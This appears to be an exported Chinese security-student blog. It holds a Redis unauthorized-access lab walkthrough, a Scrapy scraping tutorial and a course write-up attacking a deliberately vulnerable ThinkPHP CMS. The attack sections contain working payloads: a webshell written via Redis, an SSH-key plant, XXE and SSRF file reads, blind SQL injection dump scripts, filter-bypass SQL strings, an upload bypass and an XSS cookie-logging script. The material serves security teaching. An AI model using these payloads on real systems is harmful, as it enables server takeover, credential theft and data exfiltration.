然后进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了），并将redis.conf拷贝到/etc/目录下。 cd src cp redis-cli /usr/bin cp redis-server /usr/bin cp redis.conf /etc/ 开启redis服务 redis-server /etc/redis.conf 第一台作为攻击机即可，然后将这台主机克隆作为目标主机 攻击机 ip:192.168.164.145 目标主机 ip:192.168.164.23 首先确定目标主机是否开启redis服务，使用nmap扫描端口6379 如下，显示了目标使用的redis版本以及服务器的信息 开始利用 1.写入木马文件首先进入redis安装目录的src中执行 ./redis-cli -h 192.168.164.23 成功控制目标的redis服务 向其网站根目录中写入一句话木马 config set dir /var/www/html config set dbfilename shell.php set x &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; save save成功后，目标主机的网站根目录就出现了木马文件 使用蚁剑连接 2.写ssh-keygen公钥然后使用私钥进行登陆写入ssh公钥后可以在本机存储对应的ssh密钥，然后直接无密码登陆。 首先生成公钥密钥文件 ssh-keygen -t rsa cat /root/.ssh/id_rsa.pub 继续使用命令 config set dir /root/.ssh/ config set authorized_keys set x &quot;\\n\\n\\n\\id_rsa.pub的内容\\n\\n\\n&quot; save 使用公钥连接 ssh -i id_rsa root@192.168.164.23 这里的id_rsa与创建ssh密钥输入的内容一致 3.利用计划任务反弹shell只能在centos环境中利用因为centos环境中的计划任务文件可以忽略乱码，ubuntu环境因为无法忽略文件中的乱码因此无法使用 漏洞修复1、限制登录ip在redis.conf文件中设置redis访问的ip白名单，如果项目允许的话最好设置为只允许本地访问。 2、添加密码在redis.conf配置文件中找到requirepass并去掉前面的#， 然后在后面设置一个高强度的密码。因为redis验证密码的速度很快，给攻击者进行高速的爆破密码提供了一个良好的基础，所以设置一个高强度的密码不仅解决了未授权的问题还能防止密码爆破。 3、修改默认端口","tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://sunzhengyu99.github.io/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"scrapy","date":"2021-03-31T14:30:36.000Z","path":"2021/03/31/scrapy/","text":"学习分布式爬虫第一天xpath编写xpath学习，谷歌商店下载xpath helper，可以大大提高效率 jd也买你获取今日秒杀的商品信息 //div[@class=&quot;slider_wrapper&quot;]/a[position()&lt;5][@title] 三星Galaxy Note20 Ultra 5G(SM-N9860)S Pen&amp;三星笔记 120Hz自适应屏幕 5G手机 游戏手机 12GB+512GB 迷雾金¥9899.00¥9999.00 清风抽纸纸巾整箱24包金装原木3层130抽婴儿适用卫生纸餐巾纸抽¥57.90¥169.00 vivo Y3s 5000mAh大电池长续航 128GB大内存 AI智慧摄影 全网通新品手机 海风青 4GB+64GB¥999.00¥1098.00 一些tip 关闭配置信息显示 在setting.py添加LOG_LEVEL = &quot;WARNING&quot; 爬虫运行 在pycharm中运行爬虫项目，需要在爬虫项目所在路径下建立一个py文件(与cfg文件同目录) from scrapy import cmdline cmdline.execute(&quot;scrapy crawl 爬虫名字&quot;.split()) 小知识 将爬取到数据返回使用的时yield而不是return，返回给pipeline，pioeline中可以自定义方法 使用pipeline之前需要到seting.py中开启，就是将注释删除 爬取腾讯招聘信息的scrapy爬虫1.首先创一个项目创建项目的命令如下 scrapy startproject tencent 在进入项目创建一个爬虫 scrapy genspider hr careers.tencent.com // hr 为爬虫的网站 // careers.tencent.com这个是爬虫允许爬取的地址 2.分析网页结构和url组成进入https://careers.tencent.com/search.html. 要爬取的内容为 查看源码可以发现并没有上面的字段，只有一些js代码，这就说明https://careers.tencent.com/search.html，并不是我们爬虫的start_url，所以第一步需要在该页面中找到我们的start_url F12查看元素，并刷新网页，检查network中的XHR，很容易看到主页面显示的字段，说明我们的start_url，在这里，再查看headers获取到url https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617199191983&amp;countryId=&amp;cityId=&amp;bgIds=&amp;productId=&amp;categoryId=&amp;parentCategoryId=&amp;attrId=&amp;keyword=&amp;pageIndex=1&amp;pageSize=10&amp;language=zh-cn&amp;area=cn 接下来就是查看url的变化规则，让爬虫实现自动翻页，点击第二页再次查看上面的url https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617199575064&amp;countryId=&amp;cityId=&amp;bgIds=&amp;productId=&amp;categoryId=&amp;parentCategoryId=&amp;attrId=&amp;keyword=&amp;pageIndex=2&amp;pageSize=10&amp;language=zh-cn&amp;area=cn 很容易发现规律，就是pageIndex的值发生了变化 接下来就是工作的详情页的url 进入工作详情页，查看源码依然只有js，所以继续使用上面的方法查看url和内容 https://careers.tencent.com/tencentcareer/api/post/ByPostId?timestamp=1617199879005&amp;postId=1377253503910551552&amp;language=zh-cn 其中改变的参数是postId，与priview中的值对应 3.编写爬虫import scrapy import json &#x27;&#x27;&#x27; https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617180957390&amp;countryId=&amp;cityId=&amp;bgIds=&amp;productId=&amp;categoryId=&amp;parentCategoryId=&amp;attrId=&amp;keyword=&amp;pageIndex=1&amp;pageSize=10&amp;language=zh-cn&amp;area=cn https://careers.tencent.com/tencentcareer/api/post/ByPostId?timestamp=1617181089850&amp;postId=1123175628615454720&amp;language=zh-cn https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617181122812&amp;countryId=&amp;cityId=&amp;bgIds=&amp;productId=&amp;categoryId=&amp;parentCategoryId=&amp;attrId=&amp;keyword=&amp;pageIndex=2&amp;pageSize=10&amp;language=zh-cn&amp;area=cn &#x27;&#x27;&#x27; class HrSpider(scrapy.Spider): name = &#x27;hr&#x27; allowed_domains = [&#x27;careers.tencent.com&#x27;] # start_urls = [&#x27;http://careers.tencent.com/&#x27;] first_url = &quot;https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617180957390&amp;countryId=&amp;cityId=&amp;bgIds=&amp;productId=&amp;categoryId=&amp;parentCategoryId=&amp;attrId=&amp;keyword=&amp;pageIndex=&#123;&#125;&amp;pageSize=10&amp;language=zh-cn&amp;area=cn&quot; # firsturl的pageindex改变 # 职位详情页的url detial_url = &quot;https://careers.tencent.com/tencentcareer/api/post/ByPostId?timestamp=1617181089850&amp;postId=&#123;&#125;&amp;language=zh-cn&quot; start_urls = [first_url.format(1)] def parse(self, response): for page in range(1, 9): url = self.first_url.format(page) # 将url发送给parse_one继续处理 # 这里也是分布式爬虫与普通爬虫的最大的地方 yield scrapy.Request( url=url, callback=self.parse_one ) def parse_one(self, response): # 将网页的数据json格式化，方便获取数据 data = json.loads(response.text) # print(data) for job in data[&#x27;Data&#x27;][&#x27;Posts&#x27;]: item = &#123;&#125; # 获取json格式中的数据 item[&#x27;job_name&#x27;] = job[&#x27;RecruitPostName&#x27;] item[&#x27;job_type&#x27;] = job[&#x27;CategoryName&#x27;] postid = job[&#x27;PostId&#x27;] detial_url = self.detial_url.format(postid) # 将详情也的url交给另外一个parse_two处理 yield scrapy.Request( url=detial_url, meta=&#123;&#x27;item&#x27;: item&#125;, #这里下面会有解释 &#x27;item&#x27;可以任意取名 item则是上面的item=&#123;&#125; callback=self.parse_two ) def parse_two(self, response): item = response.meta.get(&#x27;item&#x27;) # 这里是上面的&#x27;item&#x27; data = json.loads(response.text) # print(data) item[&#x27;job_duty&#x27;] = data[&#x27;Data&#x27;][&#x27;Responsibility&#x27;] item[&#x27;job_require&#x27;] = data[&#x27;Data&#x27;][&#x27;Requirement&#x27;] yield item request类 class Request(object_ref): def __init__(self, url, callback=None, method=&#x27;GET&#x27;, headers=None, body=None, cookies=None, meta=None, encoding=&#x27;utf-8&#x27;, priority=0, dont_filter=False, errback=None, flags=None, cb_kwargs=None): self._encoding = encoding # this one has to be set first self.method = str(method).upper() self._set_url(url) self._set_body(body) if not isinstance(priority, int): raise TypeError(f&quot;Request priority not an integer: &#123;priority!r&#125;&quot;) self.priority = priority if callback is not None and not callable(callback): raise TypeError(f&#x27;callback must be a callable, got &#123;type(callback).__name__&#125;&#x27;) if errback is not None and not callable(errback): raise TypeError(f&#x27;errback must be a callable, got &#123;type(errback).__name__&#125;&#x27;) self.callback = callback self.errback = errback self.cookies = cookies or &#123;&#125; self.headers = Headers(headers or &#123;&#125;, encoding=encoding) self.dont_filter = dont_filter self._meta = dict(meta) if meta else None self._cb_kwargs = dict(cb_kwargs) if cb_kwargs else None self.flags = [] if flags is None else list(flags) 可以看到其中的参数很多，常用的是url,cookie,meta 其中meta为字典类型","tags":[{"name":"spider","slug":"spider","permalink":"https://sunzhengyu99.github.io/tags/spider/"}]},{"title":"mycms","date":"2021-03-21T07:47:46.000Z","path":"2021/03/21/mycms/","text":"网络安全与攻击实验课程作业 [TOC] 课程要求基于 Linux 操作系统（如 Ubuntu），使用 Docker 容器，选择一门自己擅长的语言（只能从 PHP、JAVA、Python 中选择）及其当前流行的开发框架（如 Java 的 Struts2、Spring、Hibernate，Python的 Django、flask，PHP 的 ThinkPHP 等） 开发一个 Web 应用系统。 具体要求： 1）该系统需内置典型的 Web 漏洞（不少于 10 种，每种可有多个）。必须包含 SQL 注入、XSS、文件上传、文件包含、命令执行、XXE和反序列化。 2）基于 Docker 容器发布系统，并完成内置典型漏洞的攻击过程。 3）将原有漏洞页面进行完善（不能直接在原有漏洞页面修改，需重新创建修复漏洞的页面）以修复所有漏洞，并通过测试证明漏 洞已经修复。 网站开发1.开发工具phpstorm+vscode phpstorm 重要用于对php代码的代码编写和修改，其提供了十分丰富的功能，帮助开发者快速修改代码，提供代码定位，能够快速的定位到某个函数所属文件，大大提高了工作效率。 而vscode则负责查看文件内容，其相对于PHP storm比较轻量，占用内存小，速度快。 2.环境搭建Linux使用docker以及docker-compose 具体为mysql 5.6 + nginx +php7.1 其中docker-compose.yml version: &#x27;3&#x27; services: nginx: image: hub.c.163.com/library/nginx:latest # 下载镜像的源，这里选择网易的镜像源，可以提高下载的速度， latest是最新版本 ports: - 80:80 # 端口映射 - 443:443 volumes: - ./nginx/nginx.conf:/etc/nginx/nginx.conf #nginx的配置文件路径 - ./nginx/conf.d:/etc/nginx/conf.d # 其他的配置文件 - ./html:/var/www #目录映射 src作为网站的根目录，网站的所有文件需要放在这里 php: build: ./php volumes: - ./html:/var/www #根目录 - ./php/php.ini:/usr/local/etc/php/php.ini # php的配置文件 - ./php/php-fpm.conf:/usr/local/etc/php-fpm.d/www.conf mysql: image: hub.c.163.com/library/mysql:5.6 volumes: - ./mysql/data:/var/lib/mysql - ./mysql/my.cnf:/etc/mysql/conf.d/my.cnf - ./mysql/init:/docker-entrypoint-initdb.d/ # 这里需要初始化一个数据库 ports: - 3306:3306 environment: - MYSQL_ROOT_PASSWORD=root # mysql数据库的密码 其余配置文件可以根据需要从网上获取。 windows搭建目的是测试使用，方便重新搭建和数据管理，为再linux上搭建做好准备 课程要求使用docker搭建运行环境，但是Linux系统是虚拟机搭建的，里面没有好用的phpStrom，所以先在windows上搭建，试试水。 工具使用phpstduy2018，apache+php7.1 首先在数据库中建立一个数据库，复制cms.sql中的内容在命令行中运行 将文件放入www目录下，修改config中的database.php内容，将用户名和密码该对应的内容 打开phpstduy,选择 其他菜单选项-&gt;站点域名管理，网站目录选择cms/public，网站名随便起，如www.mycms.com 打开host文件，添加 127.0.0.1 www.mycms.com，然后访问即可www.mycms.com/admin进入后台 账号密码都为admin 3.开发过程开发thinkphp的网站，当然离不开ThinkPHP的手册http://www.shouce.ren/api/view/a/15517 thinkphp中是基于模块\\控制器\\方法来访问网页的，所以我们必须学会如何创建一个控制器 在网站的文件下，调出终端使用 php think make:controller 模块名\\控制器名 创建完后便可以在浏览器中输入127.0.0.1\\模块名\\控制器名，进行访问，当然还要继续完善其中的内容 以上是开发最基础的部分，也是最重要的部分，所有的漏洞代码基本都需要在自己所创建的控制器中完成的。 4.网站介绍此站点采用的是基于thinkPHP的cms，此cms包含常用于一些公司主页介绍或者个人博客的搭建，是一个功能相对比较齐全的cms，但是随着功能的增多也会暴露出一些问题，所以会存在一些漏洞，加上自己根据课程要求对其进行了魔改，使得该系统包含了十二种漏洞，二十个漏洞点。 该网站是一家安全公司的主页，但是由于该安全公司刚刚成立不久，网站开发人员安全意识不够高（haha, 纯属虚构），导致该网站中存在了很多漏洞，此时一个不安好心的黑客看上了这家安全公司的网站。对该网站进行了攻击。 具体功能如下： (1).前台展示页面，包含关于我们，新闻中心，联系我们以及意见反馈四个模块 其中关于我们–&gt;公司主页 位置存在SSRF漏洞 意见反馈 存在XXE漏洞 (2).后台管理员页面，后台管理功能十分丰富，几乎包含所有需要的功能，并且可以根据需要自定义模块并安装，其中的短消息发送存在XSS漏洞，查看内网主机和phpinfo存在远程命令执行漏洞，管理会员的页面存在CSRF漏洞 (3).用户注册与登录，提供用户注册和登录功能，登录后的用户可以根据权限向不同的栏目投稿，向别的用户发送消息，支持头像更换，密码修改等功能。其中投稿位置存在XSS漏洞和文件上传漏洞，密码修改位置存在SQL注入漏洞。 (4).在前台页面中有一个单独的模块，叫免试加入，这里存在一个CTF题目，类型时unserialize，如果可以获取flag，则可以获取免试资格加入团队。 5.漏洞介绍 本地文件包含 本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞，造成这个漏洞的函数有四个include,include_once,require,require_once。该漏洞可以使用php为协议php://filter，读取php文件的源码，在一些ctf题目中很常见。 该漏洞存在于网站首页的联系我们页面 ssrf 服务器端请求伪造是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统，攻击者可以利用该漏洞对内网进行扫描探测存活的主机和端口，进而对内网进行攻击。此外该漏洞还会造成文件包含，使用file://协议+文件绝对路径可以获取服务器上的文件。 总结SSRF造成的危害： 扫内网 向内部任意主机的任意端口发送精心构造的Payload DOS攻击（请求大文件，始终保持连接Keep-Alive Always） 攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等） 利用file协议读取本地文件等 此漏洞存在访问公司主页 xxe XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是XML外部实体。 此漏洞可以形成命令执行和文件包含攻击。 此漏洞存在于意见反馈页面 sql注入 — 包含两个漏洞点 Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。 此漏洞存在与用户修改密码页面和登录修改稿件页面，二者都可以使用盲注进行攻击。 文件上传 网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。 此漏洞存在于用户上传头像的位置，上传一句话木马后可直接使用蚁剑获取shell 弱口令 弱口令顾名思义是使用了安全性比较低，并且比较常见的短字符作为密码 此漏洞存在于管理员密码，这是很常见但又很危险的一个漏洞 xss — 包含两个漏洞点 xss就是攻击者在web页面插入恶意的Script代码，当用户浏览该页之时，嵌入其中web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。攻击这可以使用xss获取处于登录状态的用户cookie，从而可以无密码登录账号。 此漏洞存在两个地方，一个是用户投稿，一个用户发送短消息 rce 是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。 此漏洞存在于后台管理页面中的信息采集–&gt;查看内网主机 任意文件下载 非法下载服务器上存在的资源 csrf 跨站点请求伪造 ， 跟XSS攻击一样，存在巨大的危害性 。利用csrf，攻击者可以盗用你的身份，以你的名义发送恶意请求。 你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 反序列化 不安全的反序列化是指网站对用户可控制的数据进行反序列化时，攻击者能够操纵序列化的对象，以将有害数据传递到应用程序代码中。甚至有可能用完全不同类的对象替换序列化的对象。更夸张的是，将对网站可用的任何类别的对象进行反序列化和实例化，而与预期的类别无关。因此，不安全的反序列化有时称为“对象注入”漏洞 此漏洞存在免试加入我们的页面，成功者可以获得一个flag。 漏洞利用渗透测试流程 1.RFI首先点击首页的最下面“优秀员工”，可以发现URL的变化，看到最后有一个file参数，猜测该页面的一些参数是从info.php中获取的，那么这个位置就应该是一个本地文件包含。尝试将info.php换成其他的文件名，发现页面中的一些内容消失了，说明这里就是用了文件包含。 那么如果没有对该参数进行过滤或者其他的限制的话，我们就可以使用php://filter协议读取到php文件的base64源码， 或者直接读取操作系统中的一些敏感文件，如/etc/passwd。 可以看到，这里没有对file协议过滤，这样就可以通过一些常用的文件路径获取到敏感文件 2.XXE注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。 xxe漏洞存在于意见反馈页面，使用Bp抓包可以看到，提交的参数是xml格式，提交成功后会返回一个提示信息 既然参数是以xml格式提交的，那么我们可以尝试构造出一个外部实体注入其中，造成文件包含或者命令执行。 使用payload读取/etc/passwd文件 &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;file;&lt;&#x2F;username&gt;&lt;info&gt;as&lt;&#x2F;info&gt;&lt;&#x2F;user&gt; 3.SSRF当访问公司主页这个页面时会发现url发生变化，并跳转到另一页面 这里是跳转到了我的博客页面，但是可能由于缺少渲染，显示不正常，尝试访问百度，get提交 ?url=https://www.baidu.com 可以发现成功跳转到了百度的页面，猜测我们提交的url参数没有进行过滤就直接带入到函数中执行。 那么我们可以尝试使用file://协议读取服务器上的文件，使用payload:?url=file:///etc/passwd，成功读取到文件内容，漏洞利用成功。 4.目录遍历在浏览器中按F12，在network中查看响应头，可以发现存在server字段，这是网站使用的服务器以及版本信息，这里可以看到是nginx 而nginx存在一个很常见的漏洞—配置不当导致的目录穿越漏洞 进行攻击 尝试访问http://192.168.164.147/files/，出现了images文件夹，这应该网站保存上传图片的位置 输入http://192.168.164.147/files../看到了网站的根目录中的内容，点击可以将部分文件下载。 5.SQL注入（4个）漏洞点一第一个sql注入漏洞点在用户登录页面，存在一个修改密码功能，先注册有一个用户，尝试修改密码，猜测其工作机制。 第一次尝试输入一个不存在的用户名，返回信息是no user! 第二次输入正确的用户名错误的密码，提示wrong password!，这个逻辑很正常 第三次输入正确的用户名和密码，而两个不一样的新密码，提示new password are different! 这上面的三种情况是修改密码时常见的情况，看似都可以正常的工作，但是如果没有对用户名这个参数进行严格的过滤的话就可以造成盲注的漏洞。 因为当我们提交完参数后，服务器要做的第一件事就是去数据库种查找是否存在该用户名，若不存在则返回no user!，若存在的话且输入的两次新密码都正确但是旧密码错误，就会提示用户wrong password!，这也是造成盲注的重要原因。比如说，我们注册的用户名和密码分别为szy和admin，但是我们提交时构造出如下的语句 account=szy&#x27; and 1=1#&amp;password=ad&amp;npassword=111&amp;newpassword=111 account=szy&#x27; and 1=2#&amp;password=ad&amp;npassword=111&amp;newpassword=111 看到以上的结果我们就可以判断一定存在注入。 构造payload account=szy&#x27; and ascii(substring(database(),1,1))&gt;100 #&amp;password=ad&amp;npassword=111&amp;newpassword=111 返回的是wrong password，说明数据库名的第一个字符的ascii码是大于100的，直接使用二分注入，脚本如下 import requests import time url = &quot;http://192.168.164.147:81/change/changepass&quot; heard = &#123;&quot;Cookie&quot;:&quot;http://192.168.164.147:81/change/changepass&quot;&#125; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # time.sleep(1) payload = &quot;szy&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125; #&quot;.format(i,mid) payload = &quot;szy&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)#&quot;.format(i,mid) payload = &quot;szy&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a&gt;&#123;1&#125;)#&quot;.format(i,mid) payload = &quot;szy&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a&gt;&#123;1&#125;)#&quot;.format(i,mid) data = &#123;&quot;account&quot;:payload, &quot;password&quot;:&quot;111a&quot;,&quot;npassword&quot;:&quot;222&quot;,&quot;newpassword&quot;:&quot;222&quot;&#125; response = requests.post(url=url,data=data,headers=heard) # t = response.text if &quot;wrong password&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) ​``` database:yzncms table:yzn_admin columns:id,username,password,roleid,encrypt ​``` yzn_admin的列名，省略了后面的列 获取管理员的用户名和密码 username:admin password:9724b5e6c56b95f5723009ef81961bfe 这个密码是32位的，可能是md5处理后保存的，暂时无法破解。 漏洞点二用户登录后，存在一个查找用户邮箱的功能，这里可能存在注入。 这里已经提示了存在了过滤，那么就看看过滤那些东西 输入一个存在的用户名，查找结果如图 输入一个不存在的用户 尝试输入 sunzy&#x27; or 1=1 # 网页报错，并将错误信息显示，可以看到输入的or,空格都被换成了空格，这还是很容易绕过的 fuzz测试后，发现过滤union,空格,or,and,select,from，可以使用双写绕过，空格的可以使用/**/替换 经过测试，发现返回结果只有一列 直接进行sql注入 获取数据库中的表名 sunda&#x27;/**/ununionion/**/selselectect/**/group_concat(table_name)/**/frfromom/**/infoorrmation_schema.tables/**/where/**/table_schema=database()# 获取字段名 sunda&#x27;/**/ununionion/**/selselectect/**/group_concat(column_name)/**/frfromom/**/infoorrmation_schema.columns/**/where/**/table_name=&quot;yzn_member&quot;# 获取字段值 sunda&#x27;/**/ununionion/**/selselectect/**/group_concat(passwoorrd)/**/frfromom/**/yzn_member# 漏洞点三用户主页-&gt;积分赠送，通过测试可以发现也是存在sql注入的 因为没有回显，需要使用盲注 盲注脚本与上面的类似，稍加修改即可。 漏洞点四注册后登录，发现其中存在一个投稿的功能，投稿后需要管理员审核，在此期间我们可以再次编辑我们的稿件 当点击编辑后，发现url上多了一个id参数，这应该是我们稿件的id，方便查询。但是通常这种参数如果过滤不严格的话也会存在SQL注入，而这个位置显然输入数字型注入。 http://192.168.164.147:81/member/content/edit.html?id=3 探测是否 存在注入，当输入?id=3 and 1=1 #时页面返回正常，但是当输入?id=3 and 1=2#,却提示了稿件不存在，说明这里也是存在注入的，但是没有回显，无法获取返回的内容只能采用盲注的方法。 ==在测试的过程种发现这个位置使用 &gt;时会出现错误提示，而&lt;不起作用，只能使用=，所以无法使用二分注入，但是直接暴力破解也很快== # -*- coding = utf - 8 -*- #@Time : 2021/3/20 9:03 #@Author : sunzy #@File : cms_sql2.py import requests import time url = &quot;http://192.168.164.147:81/member/content/edit.html?id=&quot; header = &#123;&quot;Cookie&quot;: &quot;thinkphp_show_page_trace=0|0; PHPSESSID=d2b4f4b001d70e670953a36d00ca8be6; thinkphp_show_page_trace=0|0&quot;&#125; flag = &quot;&quot; words = [&quot;,&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;_&quot;,&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;,&quot;F&quot;,&quot;G&quot;,&quot;H&quot;,&quot;I&quot;,&quot;J&quot;,&quot;K&quot;,&quot;L&quot;,&quot;M&quot;,&quot;N&quot;,&quot;O&quot;,&quot;P&quot;,&quot;Q&quot;,&quot;R&quot;,&quot;S&quot;,&quot;T&quot;,&quot;U&quot;,&quot;V&quot;,&quot;W&quot;,&quot;X&quot;,&quot;Y&quot;,&quot;Z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;] def dump(): flag = &#x27;&#x27; for i in range(1,50): for word in words: # payload = &quot;3 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a = &#123;1&#125;)#&quot;.format(i,ord(word)) payload = &quot;3 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a=&#123;1&#125;)#&quot;.format(i,ord(word)) payload = &quot;3 and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a=&#123;1&#125;)#&quot;.format(i,ord(word)) url1 = url+payload res = requests.get(url1,headers=header) if &quot;立即提交&quot; in res.text: flag += word break print(flag) if __name__ == &#x27;__main__&#x27;: dump() 成功获取到数据库名，漏洞利用成功。 6.暴力破解该漏洞是由于管理员或者用户使用了常用的简单密码，攻击者可以通过暴力破解的方式获取用户名和密码，前面的sql注入我们可以知道管理员账号为admin,但是密码为加盐后的md5值，我们无法破解，只能尝试使用暴力破解。 在文件上传漏洞点一中我们发现了admin模块就在路径为\\application\\admin，所以管理员后台url应该为http://192.168.164.147/admin 当然这里也可以根据经验猜测后台登录路径。 访问后台 查看源码可以发现，登录是需要token的，但是还是可以使用bp自带的模块破解，不过需要麻烦一点。 使用bp抓包，将数据包发送到Intruder模块，然后加上参数，选择Pitchfork模式 到option页面，不可以多线程 设置payload1,也就是token值 设置payload2 password的值，这里可以选择自己收藏的密码字典，或者直接使用bp自带的。 爆破结果 当密码为admin时，可以看到相应包中返回的数据存在一个url，很明显这里是，登录成功后进行的跳转，可以在浏览器中看到，已经登录到了后台页面 结合前面sql注入获取的密码和encrypt，尝试猜测密码的保存方式 md5(&#x27;adminWo0bAa&#x27;) = 9724b5e6c56b95f5723009ef81961bfe 所以密码保存的是密码和加密因子拼接后的md5值。 7.文件上传（3个）漏洞点一用户登录后可以看到一个图片征集页面http://192.168.164.147/member/index/photo 随便上传一个图片文件后，可以看到返回了图片的保存地址 但是当上传一个非图片类型时，会提示只允许上传.jpg|.png|.gif 这只是前端检测，抓包就可以解决 抓包上传一个php为后缀的文件，并将MIME改为image/jpeg,可以看到php后缀被换成空了 尝试双写绕过，可以看到文件已经正常上传 访问可以看到phpinfo 下面就是上传一句话木马，控制服务器 漏洞点二用户登录后可以在内容管理—&gt;在线投稿的位置投稿，这里用户可以上传稿件中需要用到图片 但是攻击者可能会上传一些刻意文件，比如一句话木马，来攻击服务器，下面我们上传一个php文件获取phpinfo 首先选择一张空的照片，然后将其改为php文件，内容为&lt;? phpinfo(); ?&gt;，可以看到上传成功的url 访问服务器返回的url，已经看到该网站的phpinfo信息，也就是确定了该上传目录拥有可执行权限，下一步就是上传一句话木马进一步控制该服务器。 上传一句话木马 使用蚁剑连接即可。 漏洞点三在上一步中我们已经知道了admin的账号密码，然后登录。再用自己注册的账号向某个栏目投稿，之后管理员再审核，便会出现一个类似于用户投稿的页面，然后就可以像上一个漏洞一样上传一句话木马文件。 8.XSS（2个）漏洞点一登录管理员账号后可以发送短消息给用户 在之前的sql注入漏洞里，我们可以获取yzn_member表中的所有信息，虽然可以获取密码，但是因为是md5值，并且是加盐后的md5值，破解的难度很高，所以可以使用获取cookie的方式攻击。 从中可以看到用户登录的时间，从而可以判断该用户是否在线，我们选择那些在线的用户，获取其浏览器的cookie，这样就可以做到密码登录其账号。 尝试向用户szy发送带有恶意脚本的短消息，内容如下 发送完后，浏览器弹出xss，并且每次刷新都会出现弹窗，说明是存储型XSS。 当用户点开收件箱时，浏览器也会出现弹窗，说明漏洞利用成 ==尝试获取用户cookie(失败)== 首先在服务器上写一个获取cookie的脚本，内容如下，就是获取cookie参数，然后将其写入cookie.txt中，并记录写入的时间。 &lt;?php $cookie = $_GET[&#x27;cookie&#x27;]; $ip = getenv (&#x27;REMOTE_ADDR&#x27;); $time = date(&#x27;Y-m-d g:i:s&#x27;); $fp = fopen(&quot;cookie.txt&quot;,&quot;a&quot;); fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\\n&quot;); fclose($fp); ?&gt; 然后向用户发送带有恶意脚本的消息，192.168.164.1为服务器的ip地址，这里就使用了自己的本机地址，而在现实的渗透测试中是需要选择能够与公网通信的服务器或者vps。 当用户点开收件箱后，这个脚本就会自动执行，就可以将cookie写入到服务器上的cookie.txt。 查看cookie.txt 获取的cookie 但是可以发现这里的cookie好像并不完整，看了一下原来是PHPsession值那里设置了http-only，而http-only就是防止通过js脚本读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容。 漏洞点二登录后的用户可以在留言板进行留言，留言后会显示近期的留言信息 url http://192.168.164.147/member/index/comment.html 在留言中插入恶意脚本，此时数据会被提交到服务器处理，并写入数据库，显示近期的留言，此时恶意脚本被执行，造成了XSS漏洞 可以看大恶意脚本被浏览器执行，嵌入到html页面中 9.RCE（2个）漏洞点一后台管理中存在一个采集模块，其中存在于一个“phpinfo”，点击即可查看到phpinfo信息 这里看似没有提交参数位置，让人觉得无从下手，在前端查看源码即可发现，是将输入框隐藏了，才无法看见，输入的内容。 抓包就可以发现端倪，可以看到这里存在一个post方式提交了一个data参数 提交的内容为 data=phpinfo() 